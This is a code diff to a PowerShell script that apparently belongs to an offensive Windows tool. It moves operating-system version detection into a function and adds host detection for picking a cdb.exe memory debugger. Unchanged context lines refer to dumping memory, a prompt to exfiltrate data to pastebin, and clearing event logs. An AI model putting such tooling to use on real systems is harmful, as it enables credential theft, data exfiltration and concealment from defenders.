@@ -44,11 +44,15 @@ $global:partOfADomain = 0
 $adFlag = 0
 $osArchitecture = ""
 $operatingSystem = ""
+$osArchitectureHost = ""
+$operatingSystemHost = ""
 $server = ""
 $elevate = 0
 $dev_key = $null
 $snapshot = $false
 $toADD = 0
+$mode = ""
+$hostMode = ""
 
 #----------------------------------------------------------[Declarations]----------------------------------------------------------
 
@@ -174,6 +178,11 @@ else {
         $server = Read-Host 'Enter the name of the remote server'
         $operatingSystem = (Get-WmiObject Win32_OperatingSystem -ComputerName $server).version
         $osArchitecture =  (Get-WmiObject Win32_OperatingSystem -ComputerName $server).OSArchitecture
+
+        $operatingSystemHost = (Get-WmiObject Win32_OperatingSystem).version
+        $osArchitectureHost =  (Get-WmiObject Win32_OperatingSystem).OSArchitecture
+
+        $hostMode = Get-OperatingSystemMode $operatingSystemHost $osArchitectureHost
     }
     else {
         if($dump -eq "gen") { 
@@ -181,48 +190,7 @@ else {
             $osArchitecture =  (Get-WmiObject Win32_OperatingSystem).OSArchitecture
         }
     }
-    if($operatingSystem -eq "5.1.2600" -or $operatingSystem -eq "5.2.3790"){
-        $mode = 3
-    }
-    else {
-        if($operatingSystem -eq "6.1.7601" -or $operatingSystem -eq "6.1.7600"){
-            if($osArchitecture -like "64*") {
-                $mode = 1
-            }
-            else {
-                $mode = 132
-            }
-        }
-        else {
-            if($operatingSystem -eq "6.2.9200"){
-                $mode = 2
-            }
-            else{
-                if($operatingSystem -eq "6.3.9600" -or $operatingSystem -eq "10.0.10240"){        
-                    if($osArchitecture -like "64*") {  
-                        if($operatingSystem -eq "6.3.9600"){
-                            $mode = "8.1"       
-                        }       
-                        else {
-                            $mode = "2r2"
-                        }
-                    }
-                    else {
-                        $mode = "232"
-                    }
-                }
-                else {
-                    if ($operatingSystem -eq "10.0.10514"){
-                         $mode = "2016"
-                    }
-                    else {
-                        Write-Output "The operating system could not be determined... terminating..."
-                        Stop-Script 
-                    }
-                }
-            }
-        }
-    }
+    $mode = Get-OperatingSystemMode $operatingSystem $osArchitecture
 }
 
 $exFiltrate = Read-Host 'Do you want to exfiltrate the data (pastebin) ?
@@ -263,6 +231,11 @@ if($clearEventLog -eq 1) {
      Stop-Activities $scriptPath
 }
 
+if($hostMode -ne "") {
+    $modeSave = $mode
+    $mode = $hostMode
+}
+
 if($mode -eq "2r2" -or $mode -eq "232" -or $mode -eq "2016" -or $mode -eq "8.1") {
     if($mode -eq "2r2") {
         if($snapshot -eq $true) {
@@ -301,6 +274,10 @@ else {
     else {
         $memoryWalker = "$scriptPath\debugger\pre2r2\cdb.exe"
     }
+}
+
+if($hostMode -ne "") {
+    $mode = $modeSave
 }
 
 Write-Progress -Activity "Setting environment" -status "Running..." -id 1
